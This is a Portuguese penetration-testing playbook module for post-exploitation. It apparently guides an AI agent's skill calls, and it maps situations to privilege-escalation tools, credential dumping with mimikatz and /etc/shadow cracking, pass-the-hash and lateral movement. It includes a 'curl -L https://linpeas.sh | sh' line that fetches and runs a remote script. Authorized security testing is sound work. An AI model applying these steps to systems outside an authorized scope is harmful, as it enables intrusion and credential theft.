# FASE: PÓS-EXPLORAÇÃO (módulo sob demanda)

Carregado quando: shell obtido (Linux/Windows), credenciais/hash em mãos.

## Gates — FASE 5
```
LINUX NÃO-ROOT:
  sudo sem senha     → GTFObins imediato
  SUID não-padrão    → GTFObins imediato
  cap_setuid         → capability abuse
  cron root+writable → injetar payload
  kernel desatualizado → searchsploit kernel <v> → exploit local
  linpeas limpo      → getcap -r / + env + writable paths

WINDOWS:
  SeImpersonatePrivilege → PrintSpoofer / GodPotato
  whoami /priv · whoami /groups · net user /domain
  domain-joined          → Read phases/ad.md (BloodHound coleta)

PÓS-PRIVESC:
  root Linux    → dump /etc/shadow → hashcat → reutilização
  SYSTEM Windows→ mimikatz sekurlsa::logonpasswords + lsadump::sam
  credenciais   → netexec em escopo completo
  hash          → pass-the-hash (netexec/wmiexec) em escopo
  novo host     → enxertar ALVO + repetir FASE 5
```

## F2 — Flags adaptativas linpeas
```
internet     → curl -L https://linpeas.sh | sh
sem internet → transferir + ./linpeas.sh -a   (completo) | -s (só crítico)
```

## Skill → Estado de Entrada
| Estado de entrada | Skill |
|---|---|
| Shell Linux não-root | `cybersecurity-skills:performing-privilege-escalation-on-linux` |
| Shell obtido, dump de credenciais | `cybersecurity-skills:performing-credential-access-with-lazagne` |
| Credenciais/hash, movimento lateral | `cybersecurity-skills:performing-lateral-movement-with-wmiexec` |
| Mapear contas privilegiadas | `cybersecurity-skills:performing-privileged-account-discovery` |
